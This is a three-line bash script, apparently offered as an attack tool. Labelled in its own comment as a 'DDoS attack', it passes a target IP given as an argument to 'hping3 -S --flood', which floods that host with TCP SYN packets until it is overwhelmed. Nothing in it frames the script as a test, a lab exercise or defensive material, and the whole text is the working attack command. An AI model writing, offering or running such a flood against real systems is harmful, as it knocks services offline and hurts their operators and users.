#!/bin/bash

# Target IP
TARGET_IP=$1

# Run the DDoS attack
hping3 -S --flood -V $TARGET_IP
